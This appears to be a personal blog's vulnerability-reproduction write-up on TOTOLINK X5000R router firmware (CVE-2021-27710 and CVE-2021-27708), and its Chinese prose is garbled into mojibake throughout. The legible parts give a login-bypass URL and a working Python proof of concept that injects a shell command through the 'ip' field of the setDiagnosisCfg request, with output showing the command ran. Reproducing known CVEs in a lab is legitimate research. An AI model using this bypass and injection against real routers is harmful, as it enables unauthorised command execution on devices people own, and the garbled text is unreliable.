---
layout: article
pageview: true
key: 2022-11-15-X5000R-CVE-review
title: totolink-X5000R CVEå¤ç°
author: Ch4rc0al
categories: 
    - WriteUps
tags: 
    - CTF
    - Pwn
---
æœ¬æ¥æƒ³å¤ç°2022å¹´çš„å‡ ä¸ªCVEçš„ï¼Œé€†å‘çš„æ—¶å€™æ€ä¹ˆéƒ½æ‰¾ä¸åˆ°ç›®æ ‡å‡½æ•°åœ°å€ğŸ˜¤ï¼Œç¢°å·§å‘ç°äº†ä¸‰ä¸ªå¾ˆæœ‰æ¼æ´å«Œç–‘çš„å‡½æ•°ï¼Œå¸¦ç€æ¿€åŠ¨çš„å¿ƒæƒ…è°ƒäº†ä¸€æ™šä¸ŠğŸ˜ï¼Œå‘ç°å…¶ä¸­ä¸€ä¸ªæ²¡æœ‰æ¼æ´ğŸ˜­ï¼Œå¦å¤–ä¸¤ä¸ªæ˜¯2021çš„CVEğŸ˜’
<!--more-->

### ç¯å¢ƒæ­å»º

ç¯å¢ƒæ­å»ºå‚è€ƒäº†è¿™ç¯‡åšå®¢[totolinkç™»é™†è·³è¿‡ï¼Œåˆ†ææ€è·¯](https://bbs.pediy.com/thread-271765.htm)

### é€†å‘åˆ†æ

å›ºä»¶æ˜¯`mipsel`æ¶æ„çš„ï¼Œæœ‰ç¬¦å·è¡¨ï¼Œä½†è¿™åªæ˜¯å†°å±±ä¸€è§’ï¼Œå¤§éƒ¨åˆ†å‡½æ•°éƒ½æœªè¢«è¯†åˆ«ï¼Œæˆ‘ä»¬é€šè¿‡æŸ¥æ‰¾å±é™©å‡½æ•°ï¼ˆ`systemã€popen`ï¼‰çš„äº¤å‰å¼•ç”¨æ¥å®šä½å¯èƒ½æœ‰æ¼æ´çš„å‡½æ•°

åŒæ—¶é€šè¿‡å¯¹`libshared.so`çš„åˆ†æï¼Œæ‰¾åˆ°äº†ä¸¤ä¸ªä¼šè°ƒç”¨`system`çš„å‡½æ•°ï¼š`doSystem`å’Œ`getCmdStr`

æŸ¥æ‰¾`doSystem`å‡½æ•°çš„äº¤å‰å¼•ç”¨ï¼ŒåŸºæœ¬éƒ½æ˜¯æœªè¯†åˆ«çš„å‡½æ•°ï¼Œéœ€è¦æ‰‹åŠ¨è¯†åˆ«ä¸€ä¸‹æ‰èƒ½åç¼–è¯‘ï¼Œæœ€åæ‰¾åˆ°äº†ä¸¤ä¸ªæ¼æ´å‡½æ•°ï¼Œåˆ†åˆ«å¯¹åº”`CVE-2021-27710`å’Œ`CVE-2021-27708`

![CVE-2021-27710](https://s2.loli.net/2022/11/15/JvuhRUOCn13WAfw.png)

![CVE-2021-27708](https://s2.loli.net/2022/11/15/snO92m53djNLwlY.png)

å¾ˆæ˜æ˜¾å‚æ•°ç›´æ¥æ¥æºäºè¯·æ±‚ï¼Œè€Œä¸”æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨

å¯èƒ½æ˜¯å› ä¸ºå‡½æ•°æ˜¯æˆ‘ä»¬æ‰‹åŠ¨åˆ›å»ºçš„ï¼Œå¹¶æ²¡æœ‰æ‰¾åˆ°å“ªé‡Œè°ƒç”¨äº†è¿™äº›å‡½æ•°ï¼Œä¸è¿‡ä¸€èˆ¬è·¯ç”±å™¨éƒ½æœ‰æµ‹è¯•ç½‘ç»œçš„åŠŸèƒ½ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦æ‰¾åˆ°ä½ç½®æŠ“åŒ…å°±å®Œäº‹äº†

### æŠ“åŒ…åˆ†æ

å¯åŠ¨ç¯å¢ƒåï¼Œæµè§ˆå™¨æ‰“å¼€ï¼Œéœ€è¦ç™»å½•

è¯•è¯•å¯†ç éƒ½ä¸å¯¹ï¼Œè¿˜å¥½åšå®¢é‡Œæœ‰ç»•è¿‡ç™»å½•çš„æ–¹æ³•ï¼Œç›´æ¥è®¿é—® `formLoginAuth.htm?authCode=1&action=login` è·³è¿‡ç™»å½•è¿›å…¥åå°ï¼Œæ‰¾åˆ°é«˜çº§åŠŸèƒ½

![](https://s2.loli.net/2022/11/15/CHOA5ksSm8MyUvL.png)

æˆ‘ä»¬æŠ“åŒ…åä¿®æ”¹æŒ‡ä»¤ï¼Œå‘ç°å¯ä»¥æ‰§è¡Œå¹¶ä¸”æœ‰å›æ˜¾

![](https://s2.loli.net/2022/11/15/w87YosImTVFzvuS.png)

å¦ä¸€ä¸ªCVEåªæœ‰postå†…å®¹ä¸Šçš„åŒºåˆ«ï¼Œå°±ä¸èµ˜è¿°äº†

### éšä¾¿å†™ä¸ªPOC

```python
import requests

base_url="http://localhost/"
ping_url=base_url+"cgi-bin/cstecgi.cgi"
cmd="ls -a;"
request_data='{"topicurl":"setDiagnosisCfg","ip":"-h;%s","num":"4"}' % (cmd)

headers={"accept":"application/json, text/javascript, */*; q=0.01","Content-type":"application/x-www-form-urlencoded; charset=UTF-8"}

response=requests.post(ping_url,data=request_data,headers=headers)
print(response.text)
```
```
.
..
.gdb_history
ExportSettings.sh
cstecgi.cgi
custom.cgi
{
	"success":	true,
	"error":	null,
	"lan_ip":	"",
	"wtime":	"0",
	"reserv":	"reserv"
}


```